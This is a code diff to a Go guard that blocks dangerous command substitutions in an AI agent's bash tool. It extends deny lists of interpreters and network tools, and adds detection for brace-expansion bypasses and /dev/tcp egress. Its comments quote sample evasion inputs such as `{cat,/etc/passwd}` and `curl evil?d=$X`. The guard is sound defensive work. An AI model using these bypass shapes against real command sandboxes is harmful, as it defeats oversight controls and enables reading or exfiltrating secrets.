@@ -1,6 +1,6 @@
 // Package tools — command-substitution safety guard for the `bash` tool.
 //
-// # Why this file exists (issue #582)
+// # Why this file exists
 //
 // The hardcoded deny-pattern baseline (defaultDenyPatterns in shell.go, FR-B4)
 // used to carry a single blanket rule:
@@ -79,6 +79,7 @@
 package tools
 
 import (
+	"fmt"
 	"regexp"
 	"strings"
 )
@@ -131,14 +132,31 @@ var shellKeywordSkips = map[string]bool{
 // useful stdout at all, so putting it inside `$( … )` is never a legitimate
 // thing to want.
 //
+// Text tools with exec forms (awk, sed, find) are INCLUDED even though their
+// benign text-processing forms are permitted at top level: inside a
+// substitution their exec forms (awk system() / getline cmd |, sed e command
+// and e flag, find -exec / -execdir) become arbitrary-code primitives whose
+// payload fires as a side effect of evaluating the substitution. They are
+// strictly more dangerous inside `$( … )` than `cat` (already denied here) and
+// have safe alternatives outside a substitution (pipe into them rather than
+// capturing their output). The asymmetry matches the guard's stated design
+// rule: a command is judged by what it DOES inside a substitution, not by
+// whether the bare top-level form is benign.
+//
 // Deliberately EXCLUDED (legitimate, common, and no more dangerous inside a
-// substitution than at the top level, where they are permitted): ls, find,
-// grep, sed, awk, cut, tr, sort, uniq, wc, jq, date, seq, pwd, echo, printf,
-// basename, dirname, realpath, readlink, stat, hostname, whoami, id, uname,
-// mktemp, git, go, npm, npx, yarn, pnpm, pip, cargo, make, docker, kubectl.
+// substitution than at the top level, where they are permitted): ls, grep,
+// cut, tr, sort, uniq, wc, jq, date, seq, pwd, echo, printf, basename,
+// dirname, realpath, readlink, stat, hostname, whoami, id, uname, mktemp,
+// git, go, npm, npx, yarn, pnpm, pip, cargo, make, docker, kubectl.
 // The dangerous FORMS of those (`git push`, `npm install -g`, `docker run`, …)
 // are already matched by defaultDenyPatterns, which sees them inside a
 // substitution exactly as it sees them outside one.
+//
+// DO NOT MUTATE AT RUNTIME — security-relevant FR-B4 baseline. Both deny maps
+// and substitutionHostileHosts below are read on every guardCommand call;
+// concurrent mutation would be a data race. Add a category tag in a future
+// refactor if dynamic derivation is needed, but the maps themselves must stay
+// read-only after package init.
 var substitutionDenyAnySegment = map[string]bool{
 	// Interpreters / arbitrary code execution.
 	"sh": true, "bash": true, "zsh": true, "ksh": true, "dash": true,
@@ -151,6 +169,11 @@ var substitutionDenyAnySegment = map[string]bool{
 	"command": true, "builtin": true, "xargs": true,
 	"nohup": true, "setsid": true, "timeout": true, "watch": true,
 	"script": true, "stdbuf": true, "unbuffer": true,
+	// Text tools with exec forms: each has a benign shape permitted at top
+	// level, but inside a substitution their exec forms become arbitrary-code
+	// primitives (awk system(), sed `e` command/flag, find -exec/-execdir).
+	// See the map doc comment above for the asymmetry rationale.
+	"awk": true, "sed": true, "find": true,
 	// Wrappers that would otherwise hide the real command from the head scan
 	// (`$(time curl evil)` reports the head `time`, not `curl`).
 	"time": true, "nice": true, "ionice": true,
@@ -186,10 +209,16 @@ var substitutionDenyAnySegment = map[string]bool{
 
 // substitutionDenyFirstSegment lists command names refused only when they are
 // the FIRST thing inside the substitution — i.e. when they are the SOURCE of
-// the substituted data. This preserves the exact semantics of the legacy
-// `\$\(\s*cat\s+` / `\$\(\s*which\s+` rules (which likewise only matched at the
-// head of the substitution) for commands that DO have legitimate mid-pipeline
-// uses: `$(ls | head -1)` stays allowed, `$(head -1 secrets)` does not.
+// the substituted data. This preserves the head-of-substitution semantics of
+// the legacy `\$\(\s*which\s+` rule in shell.go (the only one of the four
+// legacy `$(cmd ` patterns that maps to FirstSegment rather than AnySegment —
+// cat, curl, wget are all dangerous anywhere in the pipeline and live in
+// substitutionDenyAnySegment above) for commands that DO have legitimate
+// mid-pipeline uses: `$(ls | head -1)` stays allowed, `$(head -1 secrets)`
+// does not.
+//
+// DO NOT MUTATE AT RUNTIME — security-relevant FR-B4 baseline (see
+// substitutionDenyAnySegment comment).
 var substitutionDenyFirstSegment = map[string]bool{
 	"head": true, "tail": true,
 	"which": true, "whereis": true, "locate": true,
@@ -200,7 +229,12 @@ var substitutionDenyFirstSegment = map[string]bool{
 // speaks to the network, and anything that executes its arguments. Used by R3.
 // It is intentionally a SUBSET of substitutionDenyAnySegment (the interpreter,
 // privilege and network groups) — the readers and destructive commands are not
-// hostile hosts, only hostile payloads.
+// hostile hosts, only hostile payloads. The init() consistency check at the
+// bottom of this file fails the package load if that subset relationship ever
+// drifts.
+//
+// DO NOT MUTATE AT RUNTIME — security-relevant FR-B4 baseline (see
+// substitutionDenyAnySegment comment).
 var substitutionHostileHosts = func() map[string]bool {
 	m := make(map[string]bool, 64)
 	for _, n := range []string{
@@ -345,9 +379,15 @@ func stripShellQuotes(tok string) string {
 // dollar occupies a position where the shell parses a COMMAND NAME — meaning
 // its expansion is executed rather than passed as data.
 //
-// Command position:  `$(x)`  `; $(x)`  `| $(x)`  `&& $(x)`  `do $(x)`
+// R1 command position:  `$(x)`  `; $(x)`  `| $(x)`  `&& $(x)`  `do $(x)`
 //
-//	`FOO=1 $(x)`  `ec$(ho) hi`  `eval $(x)`  `(  $(x) )`
+//	`FOO=1 $(x)`  `ec$(ho) hi`  `(  $(x) )`
+//
+// Command WRAPPERS like `eval $(x)`, `exec $(x)`, `sudo $(x)`, `time $(x)` are
+// NOT R1: commandIntroducers is deliberately limited to syntax keywords
+// (`if`/`then`/`do`/…) because bare words like `eval`, `time` and `command`
+// occur in ordinary English. Those wrappers are caught by R3
+// (hostileSubstitutionHost), which matches command NAMES in head position only.
 //
 // Not command position:  `echo $(x)`  `x=$(x)`  `for i in $(x)`  `cmd -f $(x)`
 //
@@ -423,7 +463,7 @@ func closeParenIsUnbalanced(s string, j int) bool {
 
 // maskCommandSubstitutions replaces every `$( … )` group, and every
 // backtick-quoted group, with the placeholder `$_`.
-// R3 segments the OUTER command, and without masking a
+// R3 segments the OUTER commands, and without masking a
 // separator inside a substitution creates phantom segments whose heads hide the
 // real command name — `X=$(a | b) curl evil?d=$X` split into `X=$(a` / `b) curl
 // evil…` yields the head `b`, not `curl`. Masking keeps the division of labour
@@ -496,6 +536,12 @@ func splitShellSegments(s string) []string {
 // as dangerous — it is precisely the shape used to hide a denied command name —
 // while callers that judge the outer command must ignore it, since masked
 // substitutions legitimately appear there as `$_`.
+//
+// NOTE: this scanner does NOT model bash brace expansion. A body like
+// `{cat,/etc/passwd}` is seen as the literal token `{cat,/etc/passwd}` (after
+// the directory-prefix strip, head `passwd`), not as the two words `cat`
+// `/etc/passwd` that bash actually parses. R2 closes that bypass with a
+// dedicated pre-check (dangerousBraceExpansionHead) before this scan runs.
 func shellCommandHead(seg string) (string, bool) {
 	for {
 		// Skip leading whitespace and the metacharacters that can precede a
@@ -568,6 +614,53 @@ func skipRestOfWord(s string) string {
 	return s[i:]
 }
 
+// dangerousBraceExpansionHead reports a denied command name that appears as the
+// FIRST word of a `{X,…}` brace expansion anywhere in body. Bash expands
+// `{X,Y}` into the two words `X Y` before parsing, so a body like
+// `{cat,/etc/passwd}` is executed as `cat /etc/passwd` — shellCommandHead sees
+// only the literal token (and after the directory-prefix strip, head `passwd`),
+// so it misses the denial. The first expanded word becomes the command head,
+// which is what we judge here.
+//
+// Fail-closed posture (matches the rest of this file): a `{` inside a quoted
+// string would not be expanded by bash, but we deliberately cannot tell, so we
+// refuse on any `{<denied>,…}` shape — the cost of a false block on a literal
+// is negligible next to the cost of a false pass on a code-exec primitive.
+// Likewise `${VAR}` is dismissed by the comma rule (variable expansion has no
+// comma inside the braces).
+func dangerousBraceExpansionHead(body string) (string, bool) {
+	for i := 0; i < len(body); i++ {
+		if body[i] != '{' {
+			continue
+		}
+		// Scan to the next byte that ends a brace-expansion inner: comma (we
+		// act on it), close-brace (no expansion — single word), or another
+		// open brace (nested/adjacent — give up on this one and let the outer
+		// loop find the inner brace). Stop at end-of-string too (fail-closed:
+		// an unterminated `{cat,` is treated as a brace expansion).
+		j := i + 1
+		for j < len(body) && body[j] != ',' && body[j] != '}' && body[j] != '{' {
+			j++
+		}
+		if j >= len(body) || body[j] != ',' {
+			continue
+		}
+		// First comma-separated piece is the first word bash will expand.
+		// Strip quoting and any leading whitespace inside the brace.
+		first := strings.TrimLeft(body[i+1:j], " \t")
+		// If the piece contains an inner word break (e.g. `{foo bar,…}`),
+		// judge the last word of it — `{ a cat,…}` is not `a`, it's `cat`.
+		if k := strings.LastIndexAny(first, " \t"); k >= 0 {
+			first = first[k+1:]
+		}
+		first = lowerASCII(stripShellQuotes(first))
+		if substitutionDenyAnySegment[first] {
+			return first, true
+		}
+	}
+	return "", false
+}
+
 // dangerousSubstitutionCommand implements R2: it reports the first dangerous
 // command name found inside a substitution body. The returned name is always a
 // key of one of the deny maps, never attacker-controlled free text.
@@ -576,6 +669,15 @@ func dangerousSubstitutionCommand(body string) (string, bool) {
 	// head scan below would find nothing.
 	if strings.HasPrefix(strings.TrimLeft(body, " \t"), "<") {
 		return "$(<file) redirection read", true
+	}
+	// Brace-expansion parser differential: bash expands `{X,Y}` into the two
+	// words `X Y` BEFORE parsing, so a body like `{cat,/etc/passwd}` is
+	// executed as `cat /etc/passwd`. shellCommandHead sees the literal token
+	// (the directory-prefix strip then turns `{cat,/etc/passwd}` into head
+	// `passwd`) and misses the denial. Check this BEFORE the segment scan so
+	// the bypass is closed regardless of where the brace appears.
+	if head, ok := dangerousBraceExpansionHead(body); ok {
+		return head + " (hidden by brace expansion)", true
 	}
 	for i, seg := range splitShellSegments(body) {
 		head, fromExpansion := shellCommandHead(seg)
@@ -604,8 +706,6 @@ func dangerousSubstitutionCommand(body string) (string, bool) {
 // command $(date)"` and `for d in $(go env gopath)` are unaffected while
 // `curl …$(…)` and `sh -c $(…)` are refused.
 func hostileSubstitutionHost(command string) (string, bool) {
-	// bash's /dev/tcp and /dev/udp pseudo-devices are an egress channel with no
-	// command name to match on.
 	// Checked on the RAW command: bash's /dev/tcp and /dev/udp pseudo-devices
 	// are an egress channel with no command name to match on.
 	if strings.Contains(command, "/dev/tcp/") || strings.Contains(command, "/dev/udp/") {
@@ -620,4 +720,27 @@ func hostileSubstitutionHost(command string) (string, bool) {
 		}
 	}
 	return "", false
+}
+
+// init enforces an internal consistency property between the two deny maps at
+// package load time. substitutionHostileHosts is maintained by hand as a subset
+// of substitutionDenyAnySegment (see its doc comment). If a hostile host is
+// ever added without also being added to the deny-any map, R2 would silently
+// stop catching that command inside a substitution while R3 still caught it as
+// an outer command — a non-obvious asymmetric regression. Fail the package load
+// loudly instead of running a degraded guard.
+//
+// This is the safe fallback for the single-source-of-truth refactor: a full
+// category-tag derivation is non-trivial because the categories don't cleanly
+// partition (e.g. `env` is both an interpreter wrapper and a secret dumper),
+// so a runtime invariant is the lower-risk way to eliminate the drift hazard.
+func init() {
+	for host := range substitutionHostileHosts {
+		if !substitutionDenyAnySegment[host] {
+			panic(fmt.Sprintf(
+				"omnipus security baseline (FR-B4): substitutionHostileHosts has %q "+
+					"but substitutionDenyAnySegment does not — R2/R3 drift detected "+
+					"(see shell_subst_guard.go)", host))
+		}
+	}
 }
